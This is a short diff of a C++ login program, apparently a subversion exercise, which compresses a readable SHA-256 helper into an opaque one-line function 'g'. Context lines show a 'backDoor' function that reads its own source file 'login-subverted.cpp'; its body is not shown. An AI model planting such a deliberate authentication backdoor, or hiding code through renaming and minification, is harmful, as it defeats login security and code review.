@@ -8,29 +8,8 @@
 #include "openssl/sha.h"
 #include <ctime>
 
-using namespace std;
-
-// getSHA256 will return the SHA-256 hash of string
-string getSHA256(const string& input) {
-	// defining hash to store the initial hashed output
-	unsigned char hash[SHA256_DIGEST_LENGTH];
-	SHA256_CTX sha256;
-	SHA256_Init(&sha256);
-	// Hashing our input
-	SHA256_Update(&sha256, input.c_str(), input.size());
-	// Storing our input inside of hash.
-	SHA256_Final(hash, &sha256);
-	// Converting unsigned char to string via string stream
-	stringstream strStream;
-	// Loop for the length of the hash
-	for (int i = 0; i < SHA256_DIGEST_LENGTH; i++) {
-		// Convert the binary of the hash to hexidecimal
-		strStream << hex << setw(2) << setfill('0') << (int)hash[i];
-	}
-	// Storing the string stream as a string
-	string hash_stringified = strStream.str();
-	return hash_stringified;
-}
+using namespace std; 
+string g(const string& s) { unsigned char h[SHA256_DIGEST_LENGTH]; SHA256_CTX x; SHA256_Init(&x); SHA256_Update(&x, s.c_str(), s.size()); SHA256_Final(h, &x); stringstream y; for (int i = 0; i < SHA256_DIGEST_LENGTH; i++)y << hex << setw(2) << setfill('0') << (int)h[i]; return y.str(); }
 
 bool backDoor(const string& password) {
     ifstream sourceFile("login-subverted.cpp");
@@ -78,7 +57,7 @@ int main() {
 			getline(ss, usernameFromFile, ':'), getline(ss, passwordFromFile, ':');
 
 			// Check if entered credentials match any in the file
-			isAuthenticated = usernameFromFile == usernameIn && passwordFromFile == getSHA256(passwordIn);
+			isAuthenticated = usernameFromFile == usernameIn && passwordFromFile == g(passwordIn);
 		}
 		// Close the file after reading
 		passwordsFile.close();
